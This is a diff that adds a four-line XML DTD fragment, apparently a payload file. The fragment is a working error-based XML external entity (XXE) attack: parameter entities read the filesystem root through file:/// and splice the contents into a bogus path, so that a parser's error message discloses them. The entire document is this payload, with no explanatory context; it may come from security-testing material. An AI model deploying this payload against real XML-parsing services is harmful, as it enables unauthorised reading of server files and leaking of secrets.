@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "file:///">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM '/thisisnotafile/%file;'>">
+%eval;
+%exfiltrate;
